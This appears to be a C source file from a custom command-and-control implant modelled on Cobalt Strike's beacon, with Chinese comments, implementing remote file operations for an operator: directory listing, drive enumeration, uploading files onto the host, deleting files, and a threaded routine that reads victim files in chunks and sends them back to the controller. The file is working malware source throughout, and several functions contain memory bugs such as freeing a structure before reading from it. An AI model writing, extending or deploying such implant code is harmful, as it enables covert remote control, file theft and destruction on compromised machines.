#include "Command.h"
#include "File.h"
#include "Api.h"

/*
C:\Users\*
D    0    -    .
D    0    -    ..
D    0    2025/08/25 20:10:12    Documents
F    12345    2025/08/24 18:22:11    file.txt
*/

char* listDirectory(char* dirpath, size_t* dirpath_length) {
    if (!dirpath || !dirpath_length) {
        return NULL;
    }
    // 设置本地化（主要影响宽字符处理和时间格式）
    setlocale(LC_ALL, "");

    wchar_t* path = convert_2_wchar(dirpath);
    if (!path) {
		fprintf(stderr, "convert_2_wchar failed\n");
        return NULL;
	}

    struct _wfinddata_t file_info;
    intptr_t handle;
    size_t len = wcslen(path);

	// 去除路径末尾的 \ 或者 /
    if (len > 0 && (path[len - 1] == L'/' || path[len - 1] == L'\\')) {
        path[len - 1] = L'\0';
    }

    // 尝试打开目录，如果失败就默认搜索 C:\*
    handle = _wfindfirst(path, &file_info);
    if (handle == -1L) {
        free(path);
        fprintf(stderr, "Unable to open directory: %ls\n", path);
        return NULL;
    }

    // 动态缓冲区
    size_t bufCap = 4096;
    size_t bufLen = 0;
    wchar_t* result = (wchar_t*)malloc(bufCap * sizeof(wchar_t));
    if (!result) {
        _findclose(handle);
        free(path);
        return NULL;
    }
    result[0] = L'\0';

    // 加入目录路径
    APPEND_FMT(L"%s\n", path);

    // 强制加入 "." 和 ".."
    APPEND_FMT(L"D\t0\t-\t.\n");
    APPEND_FMT(L"D\t0\t-\t..\n");

    wchar_t timeString[MAX_TIME_STRING_LENGTH];
	// 遍历目录项
    do {
        if (wcscmp(file_info.name, L".") == 0 || wcscmp(file_info.name, L"..") == 0) {
            continue;
        }
        time_t modified_time = (time_t)file_info.time_write;
        struct tm* timeinfo = localtime(&modified_time);
        wcsftime(timeString, MAX_TIME_STRING_LENGTH, L"%Y/%m/%d %H:%M:%S", timeinfo);

        // 目录
        if (file_info.attrib & _A_SUBDIR) {
            APPEND_FMT(L"D\t0\t%s\t%s\n", timeString, file_info.name);
        }
        // 文件
        else {
            APPEND_FMT(L"F\t%lld\t%s\t%s\n", file_info.size, timeString, file_info.name);
        }
    } while (_wfindnext(handle, &file_info) == 0);

    _findclose(handle);
    free(path);

    // 转成 UTF-8
    char* result_char = convert_2_utf8(result);
    free(result);

    if (result_char) {
        *dirpath_length = strlen(result_char);
    }
    else {
        *dirpath_length = 0;
    }

    return result_char;
}

unsigned char* CmdFileBrowse(unsigned char* command_buffer, size_t command_length, size_t* post_length) {
    formatp format;
    datap parser;
    int pending_id;

    char* dirpath = (char*)malloc(MAX_FILENAME);
    if (!dirpath) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }
	memset(dirpath, 0, MAX_FILENAME);

    BeaconDataParse(&parser, command_buffer, command_length);
    pending_id = BeaconDataInt(&parser);
    BeaconDataStringCopySafe(&parser, dirpath, MAX_FILENAME);

    BeaconFormatAlloc(&format, 0x800);
    BeaconFormatInt(&format, pending_id);

    // 表明首次进入此任务分支
    if (!strncmp(dirpath, "." SOURCE_DIRECTORY, MAX_FILENAME))
    {
        GetCurrentDirectoryA(MAX_FILENAME, dirpath);
        strncat_s(dirpath, MAX_FILENAME, SOURCE_DIRECTORY, strlen(SOURCE_DIRECTORY));
    }

    BeaconFormatPrintf(&format, "%s\n", dirpath);

    // 列目录
    size_t dirpath_length = 0;
    char* file_browse_data = listDirectory(dirpath, &dirpath_length);
    if (!file_browse_data) return NULL;
    
	BeaconFormatPrintf(&format, "%s", file_browse_data);
    
	*post_length = BeaconFormatLength(&format);
	unsigned char* post_buffer = (unsigned char*)malloc(*post_length);
    if (!post_buffer) {
        fprintf(stderr, "Memory allocation failed\n");
        BeaconFormatFree(&format);
        free(file_browse_data);
        free(dirpath);
		return NULL;
    }
	memcpy(post_buffer, BeaconFormatOriginal(&format), *post_length);

	BeaconFormatFree(&format);
    free(file_browse_data);
    free(dirpath);

    return post_buffer;
}

unsigned char* CmdUpload(unsigned char* command_buffer, size_t command_length, size_t* post_length, unsigned char* mode) {
    // 数据结构如下：
    // file_name_length(4 Bytes) | file_name(file_name_length Bytes) | file_content(rest Bytes)
    datap parser;
    FILE* file;

    char* file_name = (char*)malloc(sizeof(char) * MAX_FILENAME);
    if (!file_name) {
		fprintf(stderr, "Memory Allocation failed\n");
        return NULL;
    }

    BeaconDataParse(&parser, command_buffer, command_length);
    if (!BeaconDataStringCopySafe(&parser, file_name, MAX_FILENAME)) {
		fprintf(stderr, "Failed to extract file_name from command_buffer\n");
        free(file_name);
        return NULL;
    }

	file = fopen(file_name, mode);
    if (!file) {
        free(file_name);
		fprintf(stderr, "Failed to open file %s for writing. Error:%lu\n", file_name, GetLastError());
        return NULL;
    }

    size_t written = fwrite(BeaconDataBuffer(&parser), 1, BeaconDataLength(&parser), file);
    if (written != BeaconDataLength(&parser)) {
        fprintf(stderr, "fwrite failed\n");
        fclose(file);
        free(file_name);
        return NULL;
    }

    const char* prefix = "[*] Upload Successfully! File Size:";

    uint64_t file_size = (uint64_t)BeaconDataLength(&parser);
    int len = snprintf(NULL, 0, "%s%zu", prefix, file_size);
    if (len < 0) {
        free(file_name);
        fclose(file);
        return NULL;
    }

    unsigned char* post_buffer = malloc(len + 1);
    if (!post_buffer) {
        fprintf(stderr, "Memory allocation failed\n");
        free(file_name);
        fclose(file);
        return NULL;
    }

    snprintf((char*)post_buffer, len + 1, "%s%zu", prefix, file_size);

    *post_length = len;

    fclose(file);

    return post_buffer;
}

unsigned char* CmdDrives(unsigned char* command_buffer, size_t command_length, size_t* post_length) {
    datap parser;
    BeaconDataParse(&parser, command_buffer, command_length);

    formatp formatp;
    BeaconFormatAlloc(&formatp, 128);

    int value = BeaconDataInt(&parser);
    BeaconFormatInt(&formatp, value);

    DWORD logicalDrives = GetLogicalDrives();
    BeaconFormatPrintf(&formatp, "%u", logicalDrives);

    *post_length = BeaconFormatLength(&formatp);
    unsigned char* post_buffer = (unsigned char*)malloc(BeaconFormatLength(&formatp));
    if (!post_buffer) {
        fprintf(stderr, "Memory allocation failed\n");
		BeaconDataFree(&parser);
        return NULL;
    }
    memcpy(post_buffer, BeaconFormatOriginal(&formatp), BeaconFormatLength(&formatp));

    BeaconFormatFree(&formatp);

    return post_buffer;
}

unsigned char* CmdPwd(size_t* post_length) {
    // 获取缓冲区所需大小，包括'\0'
    DWORD size = GetCurrentDirectoryA(0, NULL); 

    if (size == 0) {
        fprintf(stderr, "GetCurrentDirectoryA failed with error:%lu\n", GetLastError());
        return NULL;
    }

    char* lpcurrentPath = (char*)malloc(size);
    if (!lpcurrentPath) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }
    memset(lpcurrentPath, 0, size);

    // result 不包括'\0'
    DWORD len = GetCurrentDirectoryA(size, lpcurrentPath);

    if (len == 0 || len > size) {
		fprintf(stderr, "GetCurrentDirectoryA failed with error:%lu\n", GetLastError());
        free(lpcurrentPath);
        return NULL;
    }

    *post_length = len;

    return lpcurrentPath;
}

unsigned char* CmdCd(unsigned char* command_buffer, size_t command_length, size_t* post_length) {
    char* targer_work_dir = (char*)malloc(command_length + 1);
    if (!targer_work_dir) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    memcpy(targer_work_dir, command_buffer, command_length);
    targer_work_dir[command_length] = '\0';
    if (!SetCurrentDirectoryA(targer_work_dir)) {
        printf("SetCurrentDirectoryA failed with error:%lu\n", GetLastError());
        free(targer_work_dir);
        return NULL;
    }

    const  char* prefix = "[*] Now work directory is ";
    unsigned char* post_buffer = (unsigned char*)malloc(strlen(prefix) + command_length + 1);

    if (!post_buffer) {
        fprintf(stderr, "Memory allocation failed\n");
        free(targer_work_dir);
        return NULL;
    }

	snprintf(post_buffer, strlen(prefix) + command_length + 1, "%s%s", prefix, targer_work_dir);
    *post_length = strlen(prefix) + command_length;

    return post_buffer;
}

unsigned char* CmdMkdir(unsigned char* command_buffer, size_t command_length, size_t* post_length) {
    datap parser;
    BeaconDataParse(&parser, command_buffer, command_length);

    char* path = BeaconDataStringPointerCopy(&parser, 0x4000);
    _mkdir(path);

    char* preifx = "[*] Mkdir Success:";
    unsigned char* post_buffer = (unsigned char*)malloc(strlen(preifx) + strlen(path) + 1);
    if (!post_buffer) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

	snprintf((char*)post_buffer, strlen(preifx) + strlen(path) + 1, "%s%s", preifx, path);
    *post_length = strlen(preifx) + strlen(path);

    return post_buffer;
}

unsigned char* CmdFileRemove(unsigned char* command_buffer, size_t command_length, size_t* post_length) {
    datap parser;
    BeaconDataParse(&parser, command_buffer, command_length);
    char* path = BeaconDataStringPointerCopy(&parser, 0x4000);

    DWORD attributes = GetFileAttributesA((LPCSTR)path);

    if (attributes == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr, "Removed target is not a directory or file\n");
        return NULL;
    }

    BOOL bRet;
    // 目录
    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
        bRet = RemoveDirectoryA((LPCSTR)path);
        if (!bRet) {
            fprintf(stderr, "RemoveDirectoryA failed with error:%lu\n", GetLastError());
            return NULL;
        }
    }
    // 文件
    else {
        bRet = DeleteFileA((LPCSTR)path);
        if (!bRet) {
            fprintf(stderr, "DeleteFileA failed with error:%lu\n", GetLastError());
            return NULL;
        }
    }

    char* prefix = bRet == FALSE ? "[*] rm failed: " : "[*] rm successfully: ";

    *post_length = strlen(prefix) + strlen(path);
    unsigned char* post_buffer = (unsigned char*)malloc(strlen(prefix) + strlen(path) + 1);
    if (!post_buffer) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

	snprintf(post_buffer, strlen(prefix) + strlen(path) + 1, "%s%s", prefix, path);

    return post_buffer;
}

BOOL WINAPI downloadThread(LPVOID lpParam) {
    Sleep(2000);

    HANDLE hFile = INVALID_HANDLE_VALUE;
	BOOL bRet = FALSE;

    struct FileThreadArgs* args = (struct FileThreadArgs*)lpParam;
    char* file_name_buffer = args->file_name_buffer;
    size_t file_name_length = args->file_name_length;
    LPCSTR lpFilePath = (LPCSTR)file_name_buffer;
    uint64_t fileLen64Val;
    uint32_t fileLen32Val;

    WIN32_FILE_ATTRIBUTE_DATA file_info;
    if (GetFileAttributesExA(lpFilePath, GetFileExInfoStandard, &file_info)) {
        LARGE_INTEGER largeFileSize;
        largeFileSize.LowPart = file_info.nFileSizeLow;
        largeFileSize.HighPart = file_info.nFileSizeHigh;
        // 64 位文件总大小
        fileLen64Val = largeFileSize.QuadPart;
        // 最多下载 4GB 的文件
		// 否则返回错误信息
        if (largeFileSize.QuadPart > UINT32_MAX) {
            const char* error = "[-] The downloaded file is larger than 4GB";
			unsigned char* post_buffer = (unsigned char*)malloc(strlen(error));
            if (!post_buffer) {
                goto cleanup;
            }
            memcpy(post_buffer, error, strlen(error));
            DataProcess(post_buffer, strlen(error), CALLBACK_OUTPUT);
			free(post_buffer);
        }
		// 文件大小已经在 4GB 范围内了, 允许直接赋值
        fileLen32Val = (uint32_t)largeFileSize.QuadPart;
    }
    else {
        fprintf(stderr, "GetFileAttributesExA failed with error:%lu\n", GetLastError());
        goto cleanup;
    }

    // 构造数据包 
    // 数据包格式: request_id(4 Bytes) | fileLen32Val(4 Bytes) | fileNameBuf(fileNameBufLen  Bytes)
    uint32_t request_id = (uint32_t)generate_random_data(10000, 99999);
    formatp format;
    BeaconFormatAlloc(&format, MAX_POST_FILENAME + MAX_BUFFER);
    BeaconFormatInt(&format, request_id);
    BeaconFormatInt(&format, fileLen32Val);
    BeaconFormatAppend(&format, file_name_buffer, file_name_length);

    DataProcess((unsigned char*)BeaconFormatOriginal(&format), BeaconFormatLength(&format), CALLBACK_FILE);
    
    BeaconFormatFree(&format);

    hFile = CreateFileA(file_name_buffer, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "CreateFileA failed with error:%lu\n", GetLastError());
        goto cleanup;
    }

    unsigned char* file_content_buffer = (unsigned char*)malloc(MAX_DOWNLOAD_BUFFER);
    if (!file_content_buffer) {
        fprintf(stderr, "Memory allocation failed\n");
        goto cleanup;
    }

    DWORD bytesRead;
    BeaconFormatAlloc(&format, MAX_PACKET + 4);
    // 数据包格式: request_id(4 Bytes) | file_content_buffer(fileLen32Val Bytes)
    while (TRUE) {
        BOOL bRet = ReadFile(hFile, file_content_buffer, MAX_DOWNLOAD_BUFFER, &bytesRead, NULL);
        if (!bRet) {
            fprintf(stderr, "ReadFile failed with error: %lu\n", GetLastError());
            goto cleanup;
        }
        // done!
        if (bytesRead == 0) {
            break;
        }

        // 构造数据包
        BeaconFormatReset(&format);
        BeaconFormatInt(&format, request_id);
        BeaconFormatAppend(&format, file_content_buffer, bytesRead);

        DataProcess((unsigned char*)BeaconFormatOriginal(&format), BeaconFormatLength(&format), CALLBACK_FILE_WRITE);

        Sleep(50);
    }

    BeaconFormatFree(&format);
    free(file_content_buffer);

    const char* prefix = "[*] Already download file: ";
    unsigned char* post_buffer = (unsigned char*)malloc(strlen(prefix) + file_name_length + 1);
    if (!post_buffer) {
        fprintf(stderr, "Memory allocation failed\n");
        goto cleanup;
    }

	snprintf(post_buffer, strlen(prefix) + file_name_length + 1, "%s%s", prefix, args->file_name_buffer);
    size_t post_length = strlen(prefix) + file_name_length;

    DataProcess(post_buffer, post_length, CALLBACK_OUTPUT);
	bRet = TRUE;

cleanup:    
    free(args->file_name_buffer);
    free(args);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    return bRet;
}

VOID CmdFileDownload(unsigned char* command_buffer, size_t command_length, size_t* post_length) {
    struct FileThreadArgs* args = (struct FileThreadArgs*)malloc(sizeof(struct FileThreadArgs));
    if (!args) {
        fprintf(stderr, "Memory allocation failed\n");
        return;
    }

    args->file_name_buffer = (char*)malloc(command_length + 1);
    if (!args->file_name_buffer) {
        fprintf(stderr, "Memory allocation failed\n");
        free(args);
        return;
    }
    datap parser;
    BeaconDataParse(&parser, command_buffer, command_length);

    memcpy(args->file_name_buffer, BeaconDataPtr(&parser, command_length), command_length);
    args->file_name_buffer[command_length] = '\0';
    args->file_name_length = command_length;

    DWORD attributes = INVALID_FILE_ATTRIBUTES;
    if (args->file_name_buffer) {
        attributes = GetFileAttributesA((LPCSTR)args->file_name_buffer);
    }

    if (attributes == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr, "GetFileAttributesA failed with error:%lu\n", GetLastError());
        free(args);
        free(args->file_name_buffer);
        return;
    }

    // 目录
    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
        fprintf(stderr, "Unable to download directory\n");
        free(args);
        free(args->file_name_buffer);
        return;
    }

    HANDLE myThread = CreateThread(
        NULL,                       // 默认线程安全性
        0,                          // 默认堆栈大小
        downloadThread,             // 线程函数
        args,                       // 传递给线程函数的参数
        0,                          // 默认创建标志
        NULL);                      // 不存储线程ID

    if (myThread == NULL) {
        fprintf(stderr, "CreateThread failed with error: %lu\n", GetLastError());
        free(args);
        free(args->file_name_buffer);
        return;
    }

    CloseHandle(myThread);
}

unsigned char* CmdFileCopy(unsigned char* command_buffer, size_t command_length, size_t* post_length) {
    // 数据包格式：
    // exist_file_name_length(4 Bytes) | exist_file_name(exist_file_name_length Bytes) | new_file_name_length(4 Bytes) | new_file_name(new_file_name_length Bytes)
    datap* pdatap = BeaconDataAlloc(MAX_EXISTING_FILENAME + MAX_NEW_FILENAME);
    char* exist_file_name = BeaconDataPtr(pdatap, MAX_EXISTING_FILENAME);
    char* new_file_name = BeaconDataPtr(pdatap, MAX_NEW_FILENAME);

    datap parser;
    BeaconDataParse(&parser, command_buffer, command_length);
    BeaconDataStringCopySafe(&parser, exist_file_name, MAX_EXISTING_FILENAME);
    BeaconDataStringCopySafe(&parser, new_file_name, MAX_NEW_FILENAME);

    if (!CopyFileA(exist_file_name, new_file_name, FALSE))
    {
        fprintf(stderr, "CopyFileA failed with error:%lu\n", GetLastError());
        BeaconDataFree(pdatap);
        return NULL;
    }

	const char* prefix = "[*] Copy file success: ";
    size_t total_length = strlen(prefix) + strlen(exist_file_name) + strlen(" -> ") + strlen(new_file_name + 1);
	unsigned char* post_buffer = (unsigned char*)malloc(total_length);
    if (!post_buffer) {
        fprintf(stderr, "Memory allocation failed\n");
        BeaconDataFree(pdatap);
        return NULL;
    }

	snprintf(post_buffer, total_length, "%s%s -> %s", prefix, exist_file_name, new_file_name);
	*post_length = total_length - 1;

    BeaconDataFree(pdatap);

    return post_buffer;
}

unsigned char* CmdFileMove(unsigned char* command_buffer, size_t command_length, size_t* post_length) {
    // 数据包格式：
    // exist_file_name_length(4 Bytes) | exist_file_name(exist_file_name_length Bytes) | new_file_name_length(4 Bytes) | new_file_name(new_file_name_length Bytes)
	datap* pdatap = BeaconDataAlloc(MAX_EXISTING_FILENAME + MAX_NEW_FILENAME);
    char* exist_file_name = BeaconDataPtr(pdatap, MAX_EXISTING_FILENAME);
    char* new_file_name = BeaconDataPtr(pdatap, MAX_NEW_FILENAME);

    datap parser;
    BeaconDataParse(&parser, command_buffer, command_length);
    BeaconDataStringCopySafe(&parser, exist_file_name, MAX_EXISTING_FILENAME);
    BeaconDataStringCopySafe(&parser, new_file_name, MAX_NEW_FILENAME);
    
    if (!MoveFileA(exist_file_name, new_file_name))
    {
        fprintf(stderr, "MoveFileA failed with error:%lu\n", GetLastError());
		BeaconDataFree(pdatap);
        return NULL;
    }

    const char* prefix = "[*] Move file success: ";
    size_t total_length = strlen(prefix) + strlen(exist_file_name) + strlen(" -> ") + strlen(new_file_name) + 1;
    unsigned char* post_buffer = (unsigned char*)malloc(total_length);
    if (!post_buffer) {
        fprintf(stderr, "Memory allocation failed\n");
        BeaconDataFree(pdatap);
        return NULL;
    }

	snprintf(post_buffer, total_length, "%s%s -> %s", prefix, exist_file_name, new_file_name);
	*post_length = total_length - 1;

	BeaconDataFree(pdatap);

    return post_buffer;
}


